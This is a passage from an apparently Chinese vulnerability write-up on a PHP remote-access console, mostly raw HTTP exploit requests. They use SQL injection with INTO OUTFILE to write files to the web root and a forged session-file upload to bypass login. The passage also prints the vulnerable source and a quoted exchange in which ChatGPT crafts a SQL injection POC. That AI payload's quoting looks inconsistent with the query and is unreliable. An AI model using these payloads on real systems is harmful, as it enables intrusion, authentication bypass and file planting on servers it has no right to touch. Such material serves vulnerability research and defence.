class="line"></span><br></pre></td></tr></table></figure><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">HTTP/1.1</span> <span class="number">200</span> OK</span><br><span class="line"><span class="attribute">Date</span><span class="punctuation">: </span>Wed, 12 Apr 2023 08:56:55 GMT</span><br><span class="line"><span class="attribute">Server</span><span class="punctuation">: </span>Apache/2.4.10 (Win32) OpenSSL/1.0.2u-fips</span><br><span class="line"><span class="attribute">Set-Cookie</span><span class="punctuation">: </span>PHPSESSID=3vtpsg3sk18cr6rgp1nvdmlbm7; path=/; HttpOnly</span><br><span class="line"><span class="attribute">Expires</span><span class="punctuation">: </span>Thu, 19 Nov 1981 08:52:00 GMT</span><br><span class="line"><span class="attribute">Cache-Control</span><span class="punctuation">: </span>no-store, no-cache, must-revalidate, post-check=0, pre-check=0</span><br><span class="line"><span class="attribute">Pragma</span><span class="punctuation">: </span>no-cache</span><br><span class="line"><span class="attribute">Vary</span><span class="punctuation">: </span>Accept-Encoding</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>53</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>text/html; charset=UTF-8</span><br><span class="line"></span><br><span class="line"><span class="language-ini"><span class="section">[result]</span></span></span><br><span class="line"><span class="language-ini"><span class="attr">result</span>=<span class="number">2</span></span></span><br><span class="line"><span class="language-ini"><span class="attr">MsgID</span>=<span class="number">1</span></span></span><br><span class="line"><span class="language-ini"><span class="attr">MsgDesc</span>=ÓÃ»§Ãû»òÃÜÂë´íÎó</span></span><br></pre></td></tr></table></figure><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/js/asdxcfsea1.XGI</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>192.168.21.89:8081</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">HTTP/1.1</span> <span class="number">200</span> OK</span><br><span class="line"><span class="attribute">Date</span><span class="punctuation">: </span>Wed, 12 Apr 2023 08:57:28 GMT</span><br><span class="line"><span class="attribute">Server</span><span class="punctuation">: </span>Apache/2.4.10 (Win32) OpenSSL/1.0.2u-fips</span><br><span class="line"><span class="attribute">Vary</span><span class="punctuation">: </span>Accept-Encoding</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>12</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>text/html; charset=UTF-8</span><br><span class="line"></span><br><span class="line">1asd213asd</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="ConsoleExternalUploadApi-XGI"><a href="#ConsoleExternalUploadApi-XGI" class="headerlink" title="ConsoleExternalUploadApi.XGI"></a>ConsoleExternalUploadApi.XGI</h3><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/ConsoleExternalUploadApi.XGI</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>192.168.21.89:8081</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>*/*</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>en</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>99</span><br><span class="line"></span><br><span class="line"><span class="language-pgsql">key=ServerIPTyp<span class="string">e&#x27; union select &#x27;</span>test<span class="string">&#x27; into outfile &#x27;</span>..\\..\\WebRoot\\js\\G8Sx6In.txt&amp;initParams=x&amp;sign=x</span></span><br></pre></td></tr></table></figure><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/ConsoleExternalUploadApi.XGI?key=ServerIPType&amp;initParams=command_uploadAuthorizeKeyFile__user_admin%27+or+%271%27=%271__pwd_2__serverIdStr_1&amp;sign=8091edfafcf0936b64c7d7f2d7bb071f</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>192.168.21.89:8081</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>PHPSESSID=3vtpsg3sk18cr6rgp1nvdmlbm7; CookieLanguageName=ZH-CN</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>multipart/form-data; boundary=----WebKitFormBoundctaXAswKKlA</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>390</span><br><span class="line"></span><br><span class="line"><span class="language-n1ql">------WebKitFormBoundctaXAswKKlA</span></span><br><span class="line"><span class="language-n1ql">Content-Disposition: form-data; name=&quot;keyFile&quot;; filename=&quot;sess_cf1.key&quot;</span></span><br><span class="line"><span class="language-n1ql">Content-Type: image/png</span></span><br><span class="line"><span class="language-n1ql"></span></span><br><span class="line"><span class="language-n1ql">0|1|2|a:1:&#123;s:7:&quot;user_id&quot;;s:169:&quot;1&#x27;) Union <span class="keyword">Select</span> <span class="string">&#x27;asdasd&#x27;</span>,<span class="literal">NULL</span>,<span class="literal">NULL</span>,<span class="literal">NULL</span>,<span class="literal">NULL</span>,<span class="literal">NULL</span>,<span class="literal">NULL</span>,<span class="literal">NULL</span>,<span class="literal">NULL</span>,<span class="literal">NULL</span>,<span class="literal">NULL</span>,<span class="literal">NULL</span>,<span class="literal">NULL</span>,<span class="literal">NULL</span>,<span class="literal">NULL</span>,<span class="literal">NULL</span>,<span class="literal">NULL</span>,<span class="literal">NULL</span>,<span class="literal">NULL</span>,<span class="literal">NULL</span>,<span class="literal">NULL</span>,<span class="literal">NULL</span>,<span class="literal">NULL</span>,<span class="literal">NULL</span>,<span class="literal">NULL</span>,<span class="literal">NULL</span>,<span class="literal">NULL</span>,<span class="literal">NULL</span>,<span class="literal">NULL</span>,<span class="literal">NULL</span>,<span class="literal">NULL</span>,<span class="literal">NULL</span> <span class="keyword">into</span> outfile <span class="string">&#x27;..\\..\\WebRoot\\agasd.txt&#x27;</span> -- <span class="string">&quot;;&#125;</span></span></span><br><span class="line"><span class="string"><span class="language-n1ql">------WebKitFormBoundctaXAswKKlA--</span></span></span><br></pre></td></tr></table></figure><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/index.php</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>192.168.21.89:8081</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>application/json, text/javascript, */*; q=0.01</span><br><span class="line"><span class="attribute">X-Requested-With</span><span class="punctuation">: </span>XMLHttpRequest</span><br><span class="line"><span class="attribute">Referer</span><span class="punctuation">: </span>http://192.168.21.89:8081/index.php?s=/Admin/userlist</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>en,zh-CN;q=0.9,zh;q=0.8</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>think_language=en; PHPSESSID=3vtpsg3sk18cr6rgp1nvdmlbm7; UserAuthtype=0; CookieLanguageName=ZH-CN</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>29</span><br><span class="line"></span><br><span class="line"><span class="language-sas">s=/<span class="keyword">Index</span>/<span class="keyword">index</span><span class="variable">&amp;sessId</span>=cf1.<span class="keyword">key</span></span></span><br></pre></td></tr></table></figure><h3 id="ConsoleExternalApi-XGI"><a href="#ConsoleExternalApi-XGI" class="headerlink" title="ConsoleExternalApi.XGI"></a>ConsoleExternalApi.XGI</h3><h4 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h4><p>关键代码如下，已省略部分无关代码。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$initparams</span> = <span class="variable">$_REQUEST</span>[<span class="string">&#x27;initParams&#x27;</span>];</span><br><span class="line"><span class="variable">$key</span> = <span class="variable">$_REQUEST</span>[<span class="string">&#x27;key&#x27;</span>];</span><br><span class="line"><span class="variable">$sign</span> = <span class="variable">$_REQUEST</span>[<span class="string">&#x27;sign&#x27;</span>];</span><br><span class="line"><span class="comment">//testLog(&#x27;kaitou1=&#x27; . $initparams);</span></span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">stripos</span>(<span class="variable">$initparams</span>, <span class="string">&quot;exePath_&quot;</span>) &gt; <span class="number">1</span>) &#123;</span><br><span class="line">    <span class="variable">$paramArr</span> = <span class="title function_ invoke__">explode</span>(<span class="string">&quot;__&quot;</span>, <span class="variable">$initparams</span>);</span><br><span class="line"><span class="comment">//    testLog($paramArr);</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$paramArr</span>) &#123;</span><br><span class="line">        <span class="variable">$i</span> = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (; <span class="variable">$i</span> &lt; <span class="title function_ invoke__">sizeof</span>(<span class="variable">$paramArr</span>); <span class="variable">$i</span>++) &#123;</span><br><span class="line"><span class="comment">//            testLog(stripos($paramArr[$i],&quot;exePath_&quot;));</span></span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_ invoke__">stripos</span>(<span class="variable">$paramArr</span>[<span class="variable">$i</span>], <span class="string">&quot;_&quot;</span>) &gt; <span class="number">1</span>) &#123;</span><br><span class="line">                <span class="variable">$paramArrTmp</span> = <span class="title function_ invoke__">explode</span>(<span class="string">&quot;_&quot;</span>, <span class="variable">$paramArr</span>[<span class="variable">$i</span>]);</span><br><span class="line"><span class="comment">//                testLog($paramArrTmp);</span></span><br><span class="line">                <span class="keyword">if</span> (<span class="title function_ invoke__">in_array</span>(<span class="string">&quot;exePath&quot;</span>, <span class="variable">$paramArrTmp</span>)) &#123;</span><br><span class="line"><span class="comment">//                    testLog(&#x27;yuan1=&#x27; . $paramArrTmp[1]);</span></span><br><span class="line">                    <span class="keyword">if</span> (<span class="title function_ invoke__">sizeof</span>(<span class="variable">$paramArrTmp</span>) &gt; <span class="number">1</span>) &#123;</span><br><span class="line">                        <span class="variable">$b</span> = <span class="number">0</span>;</span><br><span class="line">                        <span class="keyword">for</span> (; <span class="variable">$b</span> &lt; <span class="title function_ invoke__">count</span>(<span class="variable">$paramArrTmp</span>); ++<span class="variable">$b</span>) &#123;</span><br><span class="line">                            <span class="keyword">if</span> (<span class="variable">$b</span> &gt; <span class="number">0</span>) &#123;</span><br><span class="line">                                <span class="variable">$paramArrTmp</span>[<span class="variable">$b</span>] = <span class="title function_ invoke__">urlencode</span>(<span class="variable">$paramArrTmp</span>[<span class="variable">$b</span>]);</span><br><span class="line">                            &#125;</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="variable">$paramArr</span>[<span class="variable">$i</span>] = <span class="title function_ invoke__">implode</span>(<span class="string">&quot;_&quot;</span>, <span class="variable">$paramArrTmp</span>);</span><br><span class="line"><span class="comment">//                    testLog(&quot;lianJie=&quot; . $paramArr[$i] . &#x27;---yuan2=&#x27; . $paramArrTmp[1]);</span></span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"><span class="comment">//    testLog($paramArr);</span></span><br><span class="line">    <span class="variable">$initparams</span> = <span class="title function_ invoke__">implode</span>(<span class="string">&quot;__&quot;</span>, <span class="variable">$paramArr</span>);</span><br><span class="line"><span class="comment">//    testLog(&#x27;kaitou2=&#x27; . $initparams);</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$initparams</span>) || <span class="variable">$initparams</span> == <span class="string">&quot;&quot;</span> || !<span class="keyword">isset</span>(<span class="variable">$key</span>) || <span class="variable">$key</span> == <span class="string">&quot;&quot;</span> || !<span class="keyword">isset</span>(<span class="variable">$sign</span>) || <span class="variable">$sign</span> == <span class="string">&quot;&quot;</span>) &#123;</span><br><span class="line">    <span class="title function_ invoke__">exitErrorJson</span>(<span class="string">&#x27;参数非法&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//testLog($initparams);</span></span><br><span class="line"><span class="variable">$COMCASWEB</span> = <span class="keyword">new</span> <span class="title function_ invoke__">main</span>();</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$key</span> == <span class="string">&quot;wusuokey&quot;</span>) &#123;</span><br><span class="line">    <span class="variable">$keyVal</span> = <span class="variable">$COMCASWEB</span>-&gt;<span class="title function_ invoke__">getfarminfo</span>(<span class="variable">$key</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="variable">$key</span> == <span class="string">&quot;inner&quot;</span>) &#123;</span><br><span class="line">    <span class="variable">$keyVal</span> = <span class="string">&quot;Realor&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$keyVal</span>) || <span class="keyword">empty</span>(<span class="variable">$keyVal</span>)) &#123;</span><br><span class="line">    <span class="title function_ invoke__">write_log</span>(<span class="string">&quot;&#123;&#x27;参数非法&#x27;:&#x27;key值为空&#x27;&#125;&quot;</span>);</span><br><span class="line">    <span class="title function_ invoke__">exitErrorJson</span>(<span class="string">&#x27;参数非法&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$signCalculate</span> = <span class="title function_ invoke__">md5</span>(<span class="variable">$initparams</span> . <span class="variable">$keyVal</span>);</span><br><span class="line"><span class="comment">//testLog(&quot;signCalculate=&quot; . $signCalculate);</span></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$signCalculate</span> != <span class="variable">$sign</span>) &#123;</span><br><span class="line">    <span class="title function_ invoke__">write_log</span>(<span class="string">&quot;&#123;&#x27;参数非法&#x27;:&#x27;参数加密方法错误&#x27;&#125;&quot;</span>);</span><br><span class="line">    <span class="title function_ invoke__">exitErrorJson</span>(<span class="string">&#x27;参数非法&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$paramArr</span> = <span class="title function_ invoke__">explode</span>(<span class="string">&quot;__&quot;</span>, <span class="variable">$initparams</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">count</span>(<span class="variable">$paramArr</span>) == <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="title function_ invoke__">write_log</span>(<span class="string">&quot;&#123;&#x27;参数非法&#x27;:&#x27;参数中未包含__&#x27;&#125;&quot;</span>);</span><br><span class="line">    <span class="title function_ invoke__">exitErrorJson</span>(<span class="string">&#x27;参数非法11&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$requestObj</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="comment">//testLog($paramArr);</span></span><br><span class="line"><span class="keyword">foreach</span> (<span class="variable">$paramArr</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$value</span>) &#123;</span><br><span class="line">    <span class="variable">$keyValue</span> = <span class="title function_ invoke__">explode</span>(<span class="string">&quot;_&quot;</span>, <span class="variable">$value</span>);</span><br><span class="line">    <span class="variable">$requestObj</span>[<span class="variable">$keyValue</span>[<span class="number">0</span>]] = <span class="variable">$keyValue</span>[<span class="number">1</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$DSCon</span> = <span class="title function_ invoke__">creatconniction</span>(<span class="string">&quot;DS&quot;</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$DSCon</span> == -<span class="number">1</span>) &#123;</span><br><span class="line">    <span class="title function_ invoke__">write_log</span>(<span class="string">&quot;&#123;&#x27;连接错误&#x27;:&#x27;数据库创建链接失败&#x27;&#125;&quot;</span>);</span><br><span class="line">    <span class="title function_ invoke__">exitErrorJson</span>(<span class="string">&#x27;创建数据库链接失败&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$cmd</span> = <span class="variable">$requestObj</span>[<span class="string">&#x27;command&#x27;</span>];</span><br><span class="line"><span class="variable">$adminName</span> = <span class="variable">$requestObj</span>[<span class="string">&#x27;user&#x27;</span>];</span><br><span class="line"><span class="variable">$adminName</span> = <span class="title function_ invoke__">utf8ToGbk</span>(<span class="variable">$adminName</span>);</span><br><span class="line"><span class="variable">$adminPwd</span> = <span class="variable">$requestObj</span>[<span class="string">&#x27;pwd&#x27;</span>];</span><br><span class="line"><span class="comment">//testLog($requestObj);</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// ...</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$cmd</span> == <span class="string">&quot;createUser&quot;</span>) &#123;</span><br><span class="line">    <span class="variable">$POST_JSON</span> = <span class="title function_ invoke__">json_decode</span>(<span class="variable">$HTTP_RAW_POST_DATA</span>, <span class="literal">true</span>);</span><br><span class="line">    <span class="variable">$fId</span> = <span class="title function_ invoke__">getDefaultVal</span>(<span class="variable">$POST_JSON</span>[<span class="string">&#x27;userGroupId&#x27;</span>], <span class="title function_ invoke__">getAdminGroupId</span>());</span><br><span class="line">    <span class="variable">$account</span> = <span class="variable">$POST_JSON</span>[<span class="string">&#x27;account&#x27;</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$account</span>) || <span class="keyword">empty</span>(<span class="variable">$account</span>)) &#123;</span><br><span class="line">        <span class="title function_ invoke__">write_log</span>(<span class="string">&quot;&#123;&#x27;createUser&#x27;:&#x27;用户账户不可为空&#x27;&#125;&quot;</span>);</span><br><span class="line">        <span class="title function_ invoke__">exitErrorJson</span>(<span class="string">&#x27;用户账号不可为空&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$account</span> = <span class="title function_ invoke__">utf8ToGbk</span>(<span class="variable">$account</span>);</span><br><span class="line"></span><br><span class="line">    <span class="variable">$userPwd</span> = <span class="variable">$POST_JSON</span>[<span class="string">&#x27;userPwd&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$userPwd</span>) || <span class="keyword">empty</span>(<span class="variable">$userPwd</span>)) &#123;</span><br><span class="line">        <span class="title function_ invoke__">write_log</span>(<span class="string">&quot;&#123;&#x27;createUser&#x27;:&#x27;用户密码不可为空&#x27;&#125;&quot;</span>);</span><br><span class="line">        <span class="title function_ invoke__">exitErrorJson</span>(<span class="string">&#x27;用户密码不可为空&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//账号是否已存在</span></span><br><span class="line">    <span class="variable">$result</span> = <span class="title function_ invoke__">mysql_query</span>(<span class="string">&quot;select * from cuser where name=&#x27;&quot;</span> . <span class="variable">$account</span> . <span class="string">&quot;&#x27;&quot;</span>, <span class="variable">$DSCon</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">mysql_num_rows</span>(<span class="variable">$result</span>) == <span class="number">1</span>) &#123;</span><br><span class="line">        <span class="title function_ invoke__">write_log</span>(<span class="string">&quot;&#123;&#x27;createUser&#x27;:&#x27;要添加的账户&#x27;.<span class="subst">$account</span>.&#x27;已存在&#x27;&#125;&quot;</span>);</span><br><span class="line">        <span class="title function_ invoke__">exitErrorJson</span>(<span class="string">&#x27;要添加的账户已存在！&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="comment">// ...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>将如上代码进行优化，删除多余的注释和无关紧要的判断后，将优化后的代码交给ChatGPT去阅读理解，如下是与ChatGPT的对话。</p><blockquote><p><strong>问</strong>：如上PHP代码中存在一个SQL盲注入漏洞，请阅读理解如上PHP代码，并构造出一个最佳的POC。注意HTTP请求的Content-Type为application&#x2F;json。</p></blockquote><blockquote><p><strong>答</strong>：要对这段代码进行SQL盲注攻击，我们需要关注<code>$cmd == &quot;createUser&quot;</code>条件下的代码。在这个条件下，我们可以看到有一个SQL查询，它使用<code>$account</code>作为查询的一部分。<code>$account</code>变量是从<code>$POST_JSON[&#39;account&#39;]</code>获取的，它在HTTP请求中以JSON格式发送。</p><p>由于Content-Type为application&#x2F;json，我们需要构造一个包含恶意<code>account</code>值的JSON格式的POST请求。在这个例子中，我们将使用双引号来终止当前的字符串，并使用<code>OR</code>语句注入额外的条件，使查询始终返回至少一行结果。</p><p>例如，可以尝试使用以下<code>account</code>值：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;test\&quot; OR \&quot;1\&quot;=\&quot;1&quot;</span><br></pre></td></tr></table></figure><p>当这个值被插入到SQL查询中时，查询将变成：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from cuser where name=&#x27;test&quot; OR &quot;1&quot;=&quot;1&#x27;</span><br></pre></td></tr></table></figure><p>由于<code>&quot;1&quot;=&quot;1&quot;</code>始终为真，这将使查询返回所有行，从而使<code>mysql_num_rows($result) == 1</code>成立，导致输出错误消息“要添加的账户已存在！”。这表明成功执行了SQL盲注攻击。</p><p>要构造一个POC，我们需要发送一个POST请求，包含以下数据：</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/your_script.php</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>target_site.com</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/json</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>...</span><br><span class="line"></span><br><span class="line"><span class="language-swift">&#123;<span class="string">&quot;account&quot;</span>: <span class="string">&quot;test<span class="subst">\&quot;</span> OR <span class="subst">\&quot;</span>1<span class="subst">\&quot;</span>=<span class="subst">\&quot;</span>1&quot;</span>,<span class="string">&quot;userPwd&quot;</span>: <span class="string">&quot;any_password&quot;</span>,<span class="string">&quot;userGroupId&quot;</span>: <span class="string">&quot;any_group_id&quot;</span>&#125;</span></span><br></pre></td></tr></table></figure><p>  